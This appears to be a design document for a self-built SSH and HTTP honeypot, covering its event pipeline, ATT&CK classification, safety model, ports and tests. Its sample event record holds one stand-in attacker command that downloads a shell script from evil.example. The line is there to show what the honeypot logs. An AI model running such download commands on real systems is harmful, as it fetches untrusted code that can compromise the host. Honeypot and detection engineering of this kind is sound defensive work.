# HoneyBadger — System Architecture

## 1. Overview

HoneyBadger is a self-contained threat-intelligence honeypot suite. It exposes a fake SSH server and a fake HTTP surface, then captures, enriches, and visualizes everything an attacker does — from credential stuffing to payload downloads — without ever executing a single byte on the host.

Design goals (in priority order):

1. **Containment** — nothing an attacker does ever leaves the sandbox.
2. **Originality** — the SSH emulation, event bus, enrichment pipeline, and dashboard are all built in-house (no Cowrie).
3. **Demoability** — one `docker-compose up` spins up the whole stack, seeded by an attack simulator.
4. **Security literacy** — every event auto-classified against MITRE ATT&CK.

## 2. System diagram

```
                          ┌─────────────────────────────────────────────┐
                          │                docker-compose               │
                          │                                             │
  Attacker                │   ┌───────────────────────────────────┐     │
 ─────────► port 8022 ──► │   │  backend  (Python, one asyncio    │     │
 ─────────► port 8081 ──► │   │  loop, one container)             │     │
                          │   │                                   │     │
                          │   │  sshd.py (asyncssh)               │     │
                          │   │      │ dispatch commands          │     │
                          │   │      ▼                           │     │
                          │   │  fakeshell.py  ──► payloads.py    │     │
                          │   │                                   │     │
                          │   │  httpd.py (aiohttp)               │     │
                          │   │      │ select bait                │     │
                          │   │      ▼                           │     │
                          │   │  http_routes.py                   │     │
                          │   │       \                           │     │
                          │   │        ▼                          │     │
                          │   │   ┌─────────────┐                 │     │
                          │   │   │  raw bus    │                 │     │
                          │   │   │  (bus.py)   │                 │     │
                          │   │   └──────┬──────┘                 │     │
                          │   │          ▼                        │     │
                          │   │   pipeline.py                       │     │
                          │   │      ├── geoip.py   (enrich)       │     │
                          │   │      ├── mitre.py   (ATT&CK tag)   │     │
                          │   │      ├── credentials.py (hash+count)│     │
                          │   │      └──► storage.py ──► PostgreSQL │     │
                          │   │          │                          │     │
                          │   │             ▼                       │     │
                          │   │   enriched bus (bus.py) ──► api.py   │     │
                          │   │                      REST :8090     │     │
                          │   │                      WebSocket      │     │
                          │   └──────────┬────────────────────────┘     │
                          │              │ (WS/REST)                    │
                          │              ▼                              │
                          │   dashboard/  (React + Vite SPA)            │
                          │              │                              │
                          │   metrics.py ◄─► Prometheus ──► Grafana     │
                          │                     │                       │
                          │                     ▼                       │
                          │                 Alertmanager                │
                          └─────────────────────────────────────────────┘
```

## 3. Components

### 3.1 `backend/` — Python honeypot core

One container, one asyncio event loop, zero external brokers. All modules above compose at runtime:

| Module | Responsibility |
|---|---|
| `main.py` | Wiring: builds the buses, starts the listeners, starts the pipeline, creates the DB pool |
| `bus.py` | In-process asyncio pub/sub. Two instances: **raw bus** (sensor → pipeline) and **enriched bus** (pipeline → API) |
| `sshd.py` | `asyncssh` server. Accepts any credentials, drops the peer into `fakeshell.py` |
| `fakeshell.py` | Emulated shell: `ls`, `cd`, `pwd`, `cat`, `whoami`, `id`, `uname`, `echo`, `history`… plus `wget`/`curl` interception |
| `httpd.py` | `aiohttp` HTTP honeypot — the internet-facing edge. Own rate-limits and buffering |
| `http_routes.py` | Bait responses: fake login pages, common probe responses (wp-login, admin, `.env`, API keys…) |
| `pipeline.py` | Subscribers that transform raw events into enriched facts |
| `geoip.py` | `GeoIpProvider` interface. Default `ip-api.com` (no key, cached); MaxMind/GeoLite2 opt-in |
| `mitre.py` | Rule-based ATT&CK classifier (see §5) |
| `credentials.py` | Extracts credentials, stores **hashes only**, maintains top-N counters for the dashboard |
| `status.py/payloads.py` | Payload capture — metadata only, never fetch/execute (see §6) |
| `api.py` | REST endpoints for stats/aggregates + WebSocket broadcast of live events |
| `storage.py` | Async SQLAlchemy → PostgreSQL; repositories per entity |
| `metrics.py` | `prometheus_client` export on `:8000` |
| `alerts.py` | Threshold checks (brute-force rate, payload capture, retention lag, health) → Alertmanager |
| `retention.py` | Scheduled purge of events older than 6 months |

### 3.2 `dashboard/` — React + Vite SPA

- **Live feed** over WebSocket (new events as they land).
- **Statistics** via REST polling (counts, top credentials, top source IPs, technique breakdown).
- **Views**: live event table, charts (attacks over time, technique mix), geographic map, top-credentials panel.
- Static build served by the dashboard container (port `:3000`).

### 3.3 `monitoring/` — Observability

- **Prometheus** scrapes `backend:8000`; alert rules + recording rules.
- **Alertmanager** routes alerts (webhook/email optional).
- **Grafana** provisioned dashboards: main, SSH attacks, HTTP attacks, geographic heatmap, attack patterns.

### 3.4 PostgreSQL

- `events` — one row per captured interaction (`inet` source IP, service, username, `pass_hash`, UA, HTTP fields, command, payload refs, `technique_id`, severity).
- `credential_counts` — aggregate counters (top-N), no plaintext.
- `payloads` — URL, hash, size, quarantine status.
- GeoIP cache table.
- Indexes: `(source_ip, ts)`, `(service, ts)`.

## 4. Event model (intake contract)

```jsonc
{
  "service": "ssh | http",
  "source_ip": "203.0.113.7",
  "ts": "2026-09-24T10:15:30Z",
  "username": "root",
  "password_hash": "sha256:<hex>",   // computed at the edge
  "user_agent": "curl/8.0",
  "http_method": "POST", "http_path": "/wp-login.php", "http_status": 200,
  "command": "wget http://evil.example/x.sh",
  "payload_url": "http://evil.example/x.sh",
  "payload_sha256": "...", "payload_size": 1234
}
```

## 5. MITRE ATT&CK classification

| Event pattern | Technique |
|---|---|
| Password guessing (SSH/HTTP login attempts) | T1110 — Brute Force |
| Repeated same-credential attempts | T1110.004 — Credential Stuffing |
| Scanner / probe hits | T1595 — Active Scanning |
| Exploit-shaped payloads | T1190 — Exploit Public-Facing Application |
| Payload download attempt (`wget`/`curl`) | T1105 — Ingress Tool Transfer |
| Shell commands issued | T1059 — Command and Scripting Interpreter |
| "Successful" session context | T1078 — Valid Accounts (contextual) |

The attack simulator in `sim/simulate.py` asserts that synthetic attacks produce the correct technique tags — the classifier is verified by tests, not by hand.

## 6. Safety model

- **No plaintext credentials anywhere.** Passwords are hashed at the edge; only aggregates (+OSINT-grade metadata) are persisted.
- **Payloads are never fetched or executed.** `wget`/`curl` return fake success; only the URL + hash + size are recorded. `CAPTURE_PAYLOADS=true` (opt-in, off by default) stages files into a **noexec quarantine** for manual static review.
- **Network isolation**: the honeypot network has no egress; nothing reaches the host network.
- **Alerts are meaningful**: rate-based (brute-force wave), on payload capture, on retention lag, on service health. There is deliberately **no "login success" alert** — the honeypot always accepts credentials, so it would fire on every event.

## 7. Ports

| Service | Container | Host |
|---|---|---|
| SSH honeypot (`sshd.py`) | 22 | 8022 |
| HTTP honeypot (`httpd.py`) | 8081 | 8081 |
| Metrics (`metrics.py`) | 8000 | 8000 |
| Intake API (`api.py`) | 8090 | 8090 |
| Dashboard (React SPA) | 80 | 3000 |
| PostgreSQL | 5432 | 5432 |
| Prometheus | 9090 | 9090 |
| Alertmanager | 9093 | 9093 |
| Grafana | 3000 (container) | 3000 |

## 8. Deployment

Single-machine deployment via docker-compose (no Kubernetes in v1):

```bash
docker-compose up -d
```

Healthcheck on every service; the pipeline and storage start only after PostgreSQL is reachable.

## 9. Testing strategy

- **Unit**: fakeshell command parsing, MITRE classifier, pipeline enrichment, GeoIP provider caching, credential hashing.
- **Integration**: `test_end_to_end.sh`, `test_api_contract.py` (intake contract).
- **Security**: `test_network_isolation.sh` (containment), `test_credentials.sh` (hash-only policy).
- **Simulator**: `sim/simulate.py` — generates realistic attack traffic, used both for demos and as the integration driver.